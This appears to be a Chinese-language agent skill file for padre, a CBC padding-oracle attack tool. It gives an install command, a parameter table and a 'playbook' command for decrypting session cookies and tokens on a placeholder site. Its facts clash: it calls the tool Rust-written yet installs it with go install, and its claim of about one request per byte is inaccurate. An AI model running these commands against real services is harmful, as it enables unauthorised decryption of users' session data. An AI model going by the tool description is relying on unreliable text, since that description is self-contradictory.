---
name: padre-padding-oracle
description: padre: CBC 填充预言爆破明文。信号:密码学攻击,加密破解,自定义错误判定,线程,输出明文。
---

# padre

- 攻击大类:C49 密码误用与协议分析
- 上游仓库:https://github.com/glebarez/padre
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
go install github.com/glebarez/padre@latest
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `padre -u 'https://t.com/profile?token=MDEyMzQ1Njc4OQ=='` | Padding Oracle 攻击 |
| `-u url -er 200 -or 403` | 自定义错误判定 |
| `-t 20` | 线程 |
| `-o out.txt` | 输出明文 |

## 攻击场景 Playbook

### CBC 填充预言爆破明文

```bash
padre -u 'https://t.com/login?session=iv+cipher_b64'
# 每字节 ~1 次请求还原加密 cookie 明文
```

## 注意事项

Rust 编写的高速 padding oracle 攻击工具,自动识别错误信号,字节级恢复 CBC 明文。
